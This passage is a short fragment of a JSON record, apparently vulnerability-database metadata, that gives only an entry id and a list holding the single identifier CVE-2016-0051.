    "id": "39432", 
    "cves": [
        "CVE-2016-0051"
    ]
}